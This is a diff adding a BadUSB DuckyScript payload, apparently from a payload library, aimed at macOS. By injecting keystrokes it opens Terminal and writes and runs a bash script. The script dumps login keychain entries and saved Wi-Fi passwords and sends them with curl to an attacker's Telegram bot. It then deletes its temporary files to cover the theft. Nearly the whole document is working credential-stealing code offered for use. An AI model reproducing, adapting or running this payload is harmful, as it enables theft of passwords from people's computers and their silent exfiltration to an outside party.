@@ -1,0 +1,77 @@
+REM Title: macOS Keychain Stealer to Telegram
+REM Author: BadUSB Library
+REM Description: Extracts saved passwords from macOS Keychain and sends to Telegram
+REM Target: macOS 10.15+
+REM Category: Authentication
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create keychain extraction script
+STRING cat > /tmp/keychain_steal.sh << 'EOF'
+#!/bin/bash
+
+# Telegram configuration
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+
+# Function to send message to Telegram
+send_telegram() {
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d text="$1"
+}
+
+# Extract keychain data
+echo "=== macOS Keychain Stealer ===" > /tmp/keychain_data.txt
+echo "Date: $(date)" >> /tmp/keychain_data.txt
+echo "User: $(whoami)" >> /tmp/keychain_data.txt
+echo "Hostname: $(hostname)" >> /tmp/keychain_data.txt
+echo "" >> /tmp/keychain_data.txt
+
+# Get keychain items
+echo "=== Keychain Items ===" >> /tmp/keychain_data.txt
+security dump-keychain -d login.keychain 2>/dev/null | grep -E "acct|svce|desc" >> /tmp/keychain_data.txt
+
+# Get WiFi passwords
+echo "" >> /tmp/keychain_data.txt
+echo "=== WiFi Passwords ===" >> /tmp/keychain_data.txt
+for network in $(networksetup -listallhardwareports | grep -A 1 "Wi-Fi" | grep "Device:" | awk '{print $2}'); do
+    networksetup -listpreferredwirelessnetworks $network | while read line; do
+        if [[ $line == *"("*")"* ]]; then
+            ssid=$(echo $line | sed 's/.*(\(.*\)).*/\1/')
+            password=$(security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null)
+            if [ ! -z "$password" ]; then
+                echo "SSID: $ssid" >> /tmp/keychain_data.txt
+                echo "Password: $password" >> /tmp/keychain_data.txt
+                echo "" >> /tmp/keychain_data.txt
+            fi
+        fi
+    done
+done
+
+# Send to Telegram
+send_telegram "🔐 macOS Keychain Data Extracted"
+send_telegram "$(cat /tmp/keychain_data.txt)"
+
+# Cleanup
+rm -f /tmp/keychain_data.txt /tmp/keychain_steal.sh
+
+EOF
+ENTER
+
+REM Make script executable and run
+STRING chmod +x /tmp/keychain_steal.sh
+ENTER
+STRING /tmp/keychain_steal.sh
+ENTER
